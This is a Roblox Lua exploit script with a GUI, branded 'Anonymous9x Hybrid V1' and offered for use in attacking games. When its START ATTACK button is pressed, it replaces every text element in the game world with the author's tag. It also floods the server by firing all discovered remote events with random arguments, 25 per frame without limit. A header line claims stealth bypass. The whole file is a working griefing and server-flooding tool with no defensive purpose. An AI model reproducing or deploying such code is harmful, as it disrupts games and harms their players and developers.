-- ================================================
-- ANONYMOUS9X HYBRID V1 (COMPACT & LETHAL)
-- THEME: ARMAGEDON MINI BLACK-WHITE
-- STATUS: STEALTH BYPASS ACTIVE
-- ================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

_G.AN9X_ACTIVE = false 

local AN9X = {
    Stats = { Fires = 0, Hijacks = 0 },
    Config = {
        BurstSize = 25, 
        HijackText = "ANONYMOUS9X HEHE",
    }
}

-- 🎨 GUI CONSTRUCTION (RESIZED & COMPACT)
local function BuildUI()
    if CoreGui:FindFirstChild("An9xCompact") then CoreGui.An9xCompact:Destroy() end
    
    local Screen = Instance.new("ScreenGui", CoreGui)
    Screen.Name = "An9xCompact"

    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 280, 0, 240) -- UKURAN JAUH LEBIH KECIL
    Main.Position = UDim2.new(0.5, -140, 0.5, -120)
    Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Main.BorderSizePixel = 0
    Main.Active = true
    Main.Draggable = true
    Main.ClipsDescendants = true
    Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 6)

    local Border = Instance.new("UIStroke", Main)
    Border.Color = Color3.fromRGB(255, 255, 255)
    Border.Thickness = 2
    Border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    -- HEADER
    local Header = Instance.new("Frame", Main)
    Header.Size = UDim2.new(1, 0, 0, 30)
    Header.BackgroundTransparency = 1

    local Close = Instance.new("TextButton", Header)
    Close.Text = "×"
    Close.Size = UDim2.new(0, 30, 0, 30)
    Close.Position = UDim2.new(1, -30, 0, 0)
    Close.BackgroundTransparency = 1
    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
    Close.TextSize = 20
    Close.MouseButton1Click:Connect(function() _G.AN9X_ACTIVE = false Screen:Destroy() end)

    local Min = Instance.new("TextButton", Header)
    Min.Text = "−" -- TOMBOL MINIMIZE KEMBALI
    Min.Size = UDim2.new(0, 30, 0, 30)
    Min.Position = UDim2.new(1, -60, 0, 0)
    Min.BackgroundTransparency = 1
    Min.TextColor3 = Color3.fromRGB(255, 255, 255)
    Min.TextSize = 20
    
    local Expanded = true
    Min.MouseButton1Click:Connect(function()
        Expanded = not Expanded
        Main:TweenSize(Expanded and UDim2.new(0, 280, 0, 240) or UDim2.new(0, 280, 0, 30), "Out", "Quad", 0.3)
    end)

    -- CENTERED CONTENT
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(1, 0, 1, -30)
    Content.Position = UDim2.new(0, 0, 0, 30)
    Content.BackgroundTransparency = 1

    local Title = Instance.new("TextLabel", Content)
    Title.Text = "HYBRID V1"
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 16
    Title.BackgroundTransparency = 1

    local StatsTxt = Instance.new("TextLabel", Content)
    StatsTxt.Size = UDim2.new(1, 0, 0, 60)
    StatsTxt.Position = UDim2.new(0, 0, 0, 35)
    StatsTxt.TextColor3 = Color3.fromRGB(200, 200, 200)
    StatsTxt.Font = Enum.Font.Code
    StatsTxt.TextSize = 12
    StatsTxt.Text = "MODE: UNLIMITED ATTACK\nSTATUS: IDLE"
    StatsTxt.BackgroundTransparency = 1

    local StartBtn = Instance.new("TextButton", Content)
    StartBtn.Text = "START ATTACK"
    StartBtn.Size = UDim2.new(0.85, 0, 0, 35)
    StartBtn.Position = UDim2.new(0.075, 0, 0, 105)
    StartBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    StartBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    StartBtn.Font = Enum.Font.GothamBold
    StartBtn.TextSize = 14
    Instance.new("UICorner", StartBtn)

    local StopBtn = Instance.new("TextButton", Content)
    StopBtn.Text = "STOP"
    StopBtn.Size = UDim2.new(0.85, 0, 0, 35)
    StopBtn.Position = UDim2.new(0.075, 0, 0, 150)
    StopBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    StopBtn.Font = Enum.Font.GothamBold
    StopBtn.TextSize = 14
    Instance.new("UICorner", StopBtn)

    local Credit = Instance.new("TextLabel", Content)
    Credit.Text = "By Anonymous9x"
    Credit.Size = UDim2.new(1, 0, 0, 20)
    Credit.Position = UDim2.new(0, 0, 1, -15)
    Credit.TextColor3 = Color3.fromRGB(100, 100, 100)
    Credit.Font = Enum.Font.Code
    Credit.TextSize = 9
    Credit.BackgroundTransparency = 1

    -- 🔥 ENGINES
    local function LaunchV1()
        task.spawn(function()
            while _G.AN9X_ACTIVE do
                for _, v in pairs(workspace:GetDescendants()) do
                    pcall(function()
                        if (v:IsA("TextLabel") or v:IsA("TextBox")) and v.Text ~= AN9X.Config.HijackText then
                            v.Text = AN9X.Config.HijackText
                            v.TextColor3 = Color3.fromRGB(255, 0, 0)
                            AN9X.Stats.Hijacks = AN9X.Stats.Hijacks + 1
                        end
                    end)
                end
                task.wait(5)
            end
        end)

        task.spawn(function()
            local remotes = {}
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then table.insert(remotes, v) end
            end
            while _G.AN9X_ACTIVE do
                RunService.Heartbeat:Wait()
                for i = 1, AN9X.Config.BurstSize do
                    if not _G.AN9X_ACTIVE then break end
                    local r = remotes[math.random(1, #remotes)]
                    if r then
                        task.spawn(function() pcall(function() r:FireServer(tick(), math.random(1, 999)) end) end)
                        AN9X.Stats.Fires = AN9X.Stats.Fires + 1
                    end
                end
            end
        end)
    end

    StartBtn.MouseButton1Click:Connect(function()
        if not _G.AN9X_ACTIVE then
            _G.AN9X_ACTIVE = true
            StartBtn.Text = "ATTACKING..."
            LaunchV1()
        end
    end)

    StopBtn.MouseButton1Click:Connect(function()
        _G.AN9X_ACTIVE = false
        StartBtn.Text = "START ATTACK"
    end)

    task.spawn(function()
        while task.wait(0.2) and Main.Parent do
            if _G.AN9X_ACTIVE then
                StatsTxt.Text = string.format("TOTAL FIRES: %d\nHIJACKED: %d\nSTATUS: RUNNING", AN9X.Stats.Fires, AN9X.Stats.Hijacks)
            else
                StatsTxt.Text = "MODE: UNLIMITED ATTACK\nSTATUS: IDLE"
            end
        end
    end)
end

BuildUI()
